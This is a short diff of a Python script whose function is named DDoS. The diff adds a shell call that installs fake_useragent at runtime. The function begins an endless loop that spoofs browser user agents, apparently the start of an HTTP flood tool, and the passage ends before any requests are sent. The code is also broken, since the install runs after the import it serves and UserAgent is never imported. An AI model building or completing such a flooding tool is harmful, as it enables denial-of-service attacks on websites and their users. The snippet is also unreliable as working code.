@@ -1,6 +1,8 @@
 import requests as r
 import threading as t
 import fake_useragent as f
+import os
+os.system("pip install fake_useragent")
 def DDoS():
     while True:
         h = UserAgent()
